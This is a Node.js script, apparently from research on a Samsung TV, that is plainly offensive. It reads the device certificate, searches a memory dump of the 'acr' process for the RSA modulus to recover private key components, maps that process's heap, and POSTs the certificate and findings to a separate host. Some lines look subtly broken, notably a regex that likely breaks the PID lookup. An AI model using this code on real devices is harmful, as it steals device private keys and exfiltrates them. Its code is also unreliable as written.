"use strict";
// audit100.js - extract cert's RSA modulus, find it in acr memory (BIGNUM),
// then dump the surrounding RSA struct to recover private key components.
// Also POST the cert PEM to PC for analysis.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

// 1. read the cert PEM
var certPem = "";
try { certPem = fs.readFileSync("/usr/lib/acr/cert/SamsungDeviceCertificate.pem", "utf8"); } catch (e) {}
out.cert_pem = certPem;
out.cert_len = certPem.length;

// 2. extract DER from PEM (strip headers, base64 decode)
var derB64 = certPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
out.cert_der_b64_len = derB64.length;

// 3. find the RSA modulus in the DER
// The SubjectPublicKeyInfo contains the RSA public key as a BIT STRING
// containing a SEQUENCE { n INTEGER, e INTEGER }.
// We search for the modulus by scanning the DER for large INTEGERs.
var der = Buffer.from(derB64, "base64");
out.cert_der_len = der.length;

// Find RSA modulus: look for INTEGER tag (0x02) with long length
// The modulus is typically the largest INTEGER in the cert
var modCandidates = [];
for (var i = 0; i < der.length - 4; i++) {
    if (der[i] === 0x02) {  // INTEGER
        var lenByte = der[i+1];
        var len = 0;
        var hdrLen = 2;
        if (lenByte < 0x80) {
            len = lenByte;
        } else if (lenByte === 0x81) {
            len = der[i+2]; hdrLen = 3;
        } else if (lenByte === 0x82) {
            len = (der[i+2] << 8) | der[i+3]; hdrLen = 4;
        }
        if (len >= 64 && len <= 520) {  // plausible RSA modulus size
            var valStart = i + hdrLen;
            // skip leading zero byte if present
            var vs = valStart;
            if (der[vs] === 0x00) vs++;
            var val = der.slice(vs, valStart + len);
            if (val.length >= 64) {
                modCandidates.push({ offset: i, len: len, valHex: val.toString("hex").slice(0, 128) });
            }
        }
    }
}
out.mod_candidates = modCandidates.slice(0, 5);

// 4. search for the modulus bytes in acr memory
if (modCandidates.length > 0) {
    // use the first large INTEGER as the modulus
    var mod = modCandidates[0];
    // search for first 16 bytes of modulus in acr_mem2.bin
    var searchHex = mod.valHex.slice(0, 32);  // first 16 bytes
    out.mod_search = sh("grep -aob $'" + searchHex.replace(/(..)/g, "\\x$1") + "' /tmp/acr_mem2.bin | head -10", 2000);
}

// 5. dump acr's heap region around potential RSA struct locations
out.heap_map = sh("cat /proc/" + (trim(sh("pidof acr", 100)).match(/^\\d+/) || ["?"])[0] + "/maps 2>/dev/null | grep -E 'heap|stack|\\[anon\\]' | head -10", 1500);

post("/p100_cert", out);
post("/p100_done", { started: out.started });
